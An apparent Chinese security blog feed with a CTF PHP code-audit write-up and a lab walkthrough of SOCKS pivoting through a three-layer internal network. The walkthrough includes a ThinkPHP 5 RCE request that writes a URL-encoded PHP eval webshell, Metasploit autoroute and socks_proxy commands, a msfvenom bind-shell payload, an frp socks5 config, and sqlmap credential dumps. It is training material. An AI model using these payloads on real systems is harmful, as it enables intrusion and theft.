class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./flag.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./result.php&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>]) &lt; <span class="hljs-number">20</span>)&#123;<br><br>    <span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/^(.*)level(.*)$/&#x27;</span>, <span class="hljs-string">&#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>]);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/pass_the_level_1#/&#x27;</span>, <span class="hljs-variable">$aaa</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;here is level 2&quot;</span>;<br>        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;root_pwd&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] == <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;root_pwd&#x27;</span>])<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;</span>;<br>        <span class="hljs-comment">// START FORM PROCESSING    </span><br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;root_pwd&#x27;</span>]))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;here is level 3,do you kown how to overcome it?&quot;</span>;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;level_3&#x27;</span>])) &#123;<br>                    <span class="hljs-variable">$level_3</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;level_3&#x27;</span>]);<br>                    <br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$level_3</span>-&gt;result == <span class="hljs-variable">$result</span>) &#123;<br>                        <br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success:&quot;</span>.<span class="hljs-variable">$flag</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you never beat me!&quot;</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;out&quot;</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>            &#125;<br>        <span class="hljs-comment">// perform validations on the form data</span><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;</span>;<br>        &#125;<br><br>    &#125;<br>    <br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonono!&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span>  nonono!<br><br></code></pre></td></tr></table></figure><p>话不多说了我们来看看第一关说了个啥</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240127201514270.png" alt="image-20240127201514270"></p><p>他的意思就是说aaa最后是字符串<code>pass_the_level_1#</code></p><p>但是上面他又会以level为界限分为两个部分，但是请注意</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240127201649317.png" alt="image-20240127201649317"></p><p>他只会匹配一行，这个函数我们如果没有的匹配的话就会直接使用get传入的aaa</p><p>来做一个实验</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240127201906463.png" alt="image-20240127201906463"></p><p>发现可行，直接执行</p><p>最后还要将<code>#</code>编码一下，因为这个是url里锚点</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240127202055413.png" alt="image-20240127202055413"></p><p>0x02</p><p>我们继续来看</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240127202331765.png" alt="image-20240127202331765"></p><p>这个是一个弱比较</p><p>本身不一样，但是值一样</p><p>直接使用数组绕过</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240127202450133.png" alt="image-20240127202450133"></p><p>0x03</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240127202519100.png" alt="image-20240127202519100"></p><p>直接看这个的意思就是说</p><p>json解密之后，然后一个弱比较</p><p><a href="https://www.php.net/manual/zh/types.comparisons.php">PHP: PHP 类型比较表 - Manual</a></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240127203057708.png" alt="image-20240127203057708"></p><p>就一个一个尝试</p><p>发现不需要填写就可以绕过了</p><p>也就是值为null</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240127203138249.png" alt="image-20240127203138249"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF刷题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Socks代理</title>
    <link href="/2024/01/25/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/"/>
    <url>/2024/01/25/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="socks简介"><a href="#socks简介" class="headerlink" title="socks简介"></a>socks简介</h1><blockquote><p>  SOCKS是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。  根据OSI模型，SOCKS是会话层的协议，位于表示层与传输层之间。 使用TCP协议传输数据，因而不提供如传递 ICMP 信息之类的网络层网关服务</p></blockquote><p>由于socks是会话层的代理，不提供ICMP的代理，所以ping 是代理不了的</p><h1 id="socks代理"><a href="#socks代理" class="headerlink" title="socks代理"></a>socks代理</h1><blockquote><ol><li>被代理端与代理服务器通过 SOCKS4&#x2F;5 代理协议进行通讯；</li><li>SOCKS4：是对HTTP代理协议的加强，它不仅代理HTTP协议，而是对所有向外的连接进行代理，没有  协议限制；  </li><li>SOCKS4a：SOCKS4协议的简单扩展，允许客户端对无法解析域名的目的主机进行访问  </li><li>SOCKS5：SOCKS5比SOCKS4a多了身份验证、IPv6、UDP支持。创建与SOCKS5服务器的TCP连接后  客户端需要先发送请求来确认协议版本及认证方式</li></ol></blockquote><h2 id="使用socks代理"><a href="#使用socks代理" class="headerlink" title="使用socks代理"></a>使用socks代理</h2><blockquote><ol><li>SOCKS服务器的IP地址  </li><li>SOCKS服务所在端口  </li><li>SOCKS服务是否需要身份验证</li></ol></blockquote><h2 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h2><h3 id="EarthWorm"><a href="#EarthWorm" class="headerlink" title="EarthWorm"></a>EarthWorm</h3><blockquote><p>  <a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a>  </p></blockquote><blockquote><p>  EW 是一套便携式的网络穿透工具，具有 SOCKS v5 服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125095256134.png" alt="image-20240125095256134"></p><p>这个图就是渗透测试的路径，我们的目的就是需要达到受限区域</p><h3 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h3><blockquote><p>  <a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a>  </p></blockquote><p>  FRP 是一个可用于内网穿透的高性能的反向代理应用  </p><h3 id="ProxyChains"><a href="#ProxyChains" class="headerlink" title="ProxyChains"></a>ProxyChains</h3><blockquote><p>  <a href="http://proxychains.sourceforge.net/">http://proxychains.sourceforge.net/</a>  </p></blockquote><p>这个工具也是在渗透中比较常用的</p><h3 id="Proxiﬁer"><a href="#Proxiﬁer" class="headerlink" title="Proxiﬁer"></a>Proxiﬁer</h3><blockquote><p>  <a href="https://www.proxifier.com/">https://www.proxiﬁer.com/</a>  </p></blockquote><p>  Proxifier 是一个程序，它允许不支持通过代理服务器工作的网络应用程序通过 SOCKS 或 HTTPS代理或代理服务器链进行操作。</p><h3 id="Stowaway"><a href="#Stowaway" class="headerlink" title="Stowaway"></a>Stowaway</h3><blockquote><p>  用户可使用此程序将外部流量通过多个节点代理至内网，突破内网访问限制，构造树状节点网络，并  轻松实现管理功能  </p></blockquote><h1 id="一个三层内网的渗透过程"><a href="#一个三层内网的渗透过程" class="headerlink" title="一个三层内网的渗透过程"></a>一个三层内网的渗透过程</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>由于教学我们知道了他的ip</p><blockquote><p>192.168.79.140</p></blockquote><p>然后尝试扫描端口</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125105930204.png" alt="image-20240125105930204"></p><p>发现80端口，尝试目录扫描</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125110018111.png" alt="image-20240125110018111"></p><p>一个一个访问</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125110046964.png" alt="image-20240125110046964"></p><p>一个宝塔的欢迎页面</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125110117028.png" alt="image-20240125110117028"></p><p>发现thinkphp</p><h2 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h2><h3 id="thinkphp-rce"><a href="#thinkphp-rce" class="headerlink" title="thinkphp rce"></a>thinkphp rce</h3><p>搜索相关漏洞</p><p><a href="https://blog.csdn.net/weixin_44862511/article/details/132132998">thinkphp 5-rce版本漏洞复现(超详细版)_thinkphp 漏洞扫描-CSDN博客</a></p><blockquote><p><a href="http://192.168.79.140/public/index.php?s=index/%5Cthink%5Capp/invokefunction&function=phpinfo&vars%5B0%5D=100">http://192.168.79.140/public/index.php?s=index/\think\app/invokefunction&amp;function=phpinfo&amp;vars[0]=100</a></p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125110348901.png" alt="image-20240125110348901"></p><p>发现rce漏洞</p><p>写入webshell</p><p>写入经过url编码的一句话木马</p><blockquote><p>&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;shell.php&amp;vars[1][]&#x3D;%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%63%6d%64%27%5d%29%3b%3f%3e</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125110621769.png" alt="image-20240125110621769"></p><p>连接</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125110747173.png" alt="image-20240125110747173"></p><h3 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h3><p>首先看一下是什么平台</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125120712888.png" alt="image-20240125120712888"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125120817703.png" alt="image-20240125120817703"></p><p>生成payload</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125121218791.png" alt="image-20240125121218791"></p><p>上传到linux</p><p>获取session</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125121509645.png" alt="image-20240125121509645"></p><p>搭建代理</p><p>进入session</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> autoroute -s 192.168.22.1/24<br><span class="hljs-comment"># 看是否有路由</span><br><span class="hljs-built_in">run</span> autoroute -p<br>bg<br></code></pre></td></tr></table></figure><p>开启代理</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"> <span class="hljs-keyword">use</span> socks_proxy<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125134417585.png" alt="image-20240125134417585"></p><p>成功代理</p><p>由于会产生大量的连接，所以会出现session掉线的情况，需要重新上线</p><p>尝试存活主机探测</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125160830291.png" alt="image-20240125160830291"></p><p>不给我探测，烦人捏</p><h3 id="bash反弹一个shell"><a href="#bash反弹一个shell" class="headerlink" title="bash反弹一个shell"></a>bash反弹一个shell</h3><p>上传fscan 进行存活主机探测</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125160913460.png" alt="image-20240125160913460"></p><p>还发现了ssh 弱密码</p><p>假装没发现，这个应该是用于靶场建设的</p><p>发现了存活主机</p><p>但是先测试代理</p><p>测试代理</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125162926936.png" alt="image-20240125162926936"></p><p>好好好,sql注入是吧，先放一下</p><p>发现192.168.22.22开放了80端口，对其进行扫描</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125161402430.png" alt="image-20240125161402430"></p><p>发现一个</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125162456033.png" alt="image-20240125162456033"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125162806959.png" alt="image-20240125162806959"></p><p>尝试Sql注入</p><p>直接使用sqlmap</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125163200850.png" alt="image-20240125163200850"></p><p>使用钱前面提到的</p><p> <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125163454625.png" alt="image-20240125163454625"></p><p>隧道炸了转手注</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125165404549.png" alt="image-20240125165404549"></p><p>得到了</p><p>账号：</p><blockquote><p>admin  123qwe</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125170233509.png" alt="image-20240125170233509"></p><p>然后通过收集到的信息，进行模板注入，写入sehll，上传正向payload</p><p>然后等待连接，连接过来了</p><h1 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><a href="https://github.com/fatedier/frp/blob/dev/README_zh.md">frp&#x2F;README_zh.md at dev · fatedier&#x2F;frp (github.com)</a></p><p><a href="https://gofrp.org/zh-cn/docs/">文档 | frp (gofrp.org)</a></p><h2 id="socks代理-1"><a href="#socks代理-1" class="headerlink" title="socks代理"></a>socks代理</h2><p>socks5代理在frp 里面使用。需要设置plugin 插件为socks5</p><p>下面是使用过程，还是使用昨天的三层cfs</p><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><p>server这个部分我们只需要设置端口就可以了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126100811821.png" alt="image-20240126100811821"></p><p>添加执行权限，使用<code>-c</code>指定执行文件</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126101454569.png" alt="image-20240126101454569"></p><h3 id="client"><a href="#client" class="headerlink" title="client"></a>client</h3><p>先通过，得到的web  shell上传文件</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126100518460.png" alt="image-20240126100518460"></p><p>为了方便起见，还是上传已经编辑好了的配置文件</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = <span class="hljs-number">192.168</span>.<span class="hljs-number">79.138</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span><br><br><span class="hljs-section">[socks5]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">plugin</span> = socks5<br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">10088</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126101703163.png" alt="image-20240126101703163"></p><h3 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126102135352.png" alt="image-20240126102135352"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126102138287.png" alt="image-20240126102138287"></p><p>上传之后就来了</p><p>然后修改proxychains</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126102435686.png" alt="image-20240126102435686"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126102504460.png" alt="image-20240126102504460"></p><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ol><li>快很多，稳定很多</li></ol><h1 id="尝试使用frp-代理"><a href="#尝试使用frp-代理" class="headerlink" title="尝试使用frp 代理"></a>尝试使用frp 代理</h1><h2 id="使用Sqlmap"><a href="#使用Sqlmap" class="headerlink" title="使用Sqlmap"></a>使用Sqlmap</h2><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">proxychains sqlmap <span class="hljs-params">-u</span> <span class="hljs-string">&quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot;</span> <span class="hljs-params">-p</span> <span class="hljs-built_in">keyword</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126103506856.png" alt="image-20240126103506856"></p><blockquote><p>-p 指定爆破参数</p><p>注意：</p><ol><li>指定爆破的参数不能为空</li></ol></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126103607227.png" alt="image-20240126103607227"></p><p>发现漏洞，进行爆破数据库</p><p>添加参数<code>--dbs</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">proxychains sqlmap -u <span class="hljs-string">&quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot;</span> -<span class="hljs-selector-tag">p</span> keyword <span class="hljs-attr">--dbs</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126103654608.png" alt="image-20240126103654608"></p><p>使用<code>-D</code>指定数据库，经行爆破表<code>--tables</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">proxychains sqlmap -u <span class="hljs-string">&quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot;</span> -<span class="hljs-selector-tag">p</span> keyword -D bagecms <span class="hljs-attr">--tables</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126103819005.png" alt="image-20240126103819005"></p><p>使用<code>-T</code> 指定表名，使用<code>--columns</code>爆破字段名</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">proxychains sqlmap -u <span class="hljs-string">&quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot;</span> -p keyword -D bagecms -<span class="hljs-built_in">T</span> bage_admin --<span class="hljs-built_in">columns</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126104016094.png" alt="image-20240126104016094"></p><p>使用<code>-C</code>进行指定字段名 <code>--dump</code>进行获取字段的值</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">proxychains</span> <span class="hljs-variable">sqlmap</span> <span class="hljs-operator">-</span><span class="hljs-variable">u</span> <span class="hljs-string">&quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot;</span> <span class="hljs-operator">-</span><span class="hljs-variable">p</span> <span class="hljs-variable">keyword</span> <span class="hljs-operator">-</span><span class="hljs-built_in">D</span> <span class="hljs-variable">bagecms</span> <span class="hljs-operator">-</span><span class="hljs-variable">T</span> <span class="hljs-type">bage_admin</span> <span class="hljs-operator">-</span><span class="hljs-built_in">C</span> <span class="hljs-variable">username</span><span class="hljs-operator">,</span><span class="hljs-variable">password</span> <span class="hljs-operator">--</span><span class="hljs-variable">dump</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126104357331.png" alt="image-20240126104357331"> </p><p>得到hash和密码123qwe</p><h1 id="192-168-22-22"><a href="#192-168-22-22" class="headerlink" title="192.168.22.22"></a>192.168.22.22</h1><p>回顾一下，这个有一个80端口服务，然后在frp代理之下尝试扫描目录<br>通过搜素获取</p><p>路径</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">22.22</span><span class="hljs-regexp">/index.php?r=admini/</span>default/index<br></code></pre></td></tr></table></figure><p>使用</p><blockquote><p>admin 123qwe</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126121118329.png" alt="image-20240126121118329"></p><p>通过搜素，得到有一个模板注入的地方</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126121147699.png" alt="image-20240126121147699"></p><p>通过修改php文件内容（添加一句话木马）</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126131821197.png" alt="image-20240126131821197"></p><p>进行访问，使用之前的<code>index.php?</code>添加参数的形式</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126132343025.png" alt="image-20240126132343025"></p><p>使用蚁剑连接，但是直接连接是连接不上的，我们必须使用代理的方式</p><p>重新开启一个antsword</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126132754450.png" alt="image-20240126132754450"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126132746418.png" alt="image-20240126132746418"></p><p>上传一个msf正向Shell</p><p>生成一个paylaod</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfvenom -p linux<span class="hljs-regexp">/x64/m</span>eterpreter/bind_tcp -f elf &gt; linux_x64_bind_tcp.elf<br></code></pre></td></tr></table></figure><p>…….尝试失败，msf好像在代理方面确认不是很擅长</p><p>现在有三个方法</p><h2 id="msf-autoroute"><a href="#msf-autoroute" class="headerlink" title="msf  autoroute"></a>msf  autoroute</h2><p>这个方法稳定性极差</p><h2 id="frp-1"><a 